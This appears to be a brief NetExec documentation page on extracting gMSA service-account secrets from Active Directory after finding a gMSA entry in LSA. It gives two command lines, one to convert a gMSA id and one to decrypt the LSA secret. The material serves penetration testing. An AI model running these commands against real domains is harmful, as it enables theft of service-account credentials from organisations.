# Extract gMSA secrets

NetExec offer multiple choices when you found a gmsa account in the LSA

```
NetExec ldap <ip> -u <user> -p <pass> --gmsa-convert-id 313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724
```

```
NetExec ldap <ip> -u <user> -p <pass> --gmsa-decrypt-lsa '_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_313e25a880eb773502f03ad5021f49c2eb5b5be2a09f9883ae0d83308dbfa724:'
```
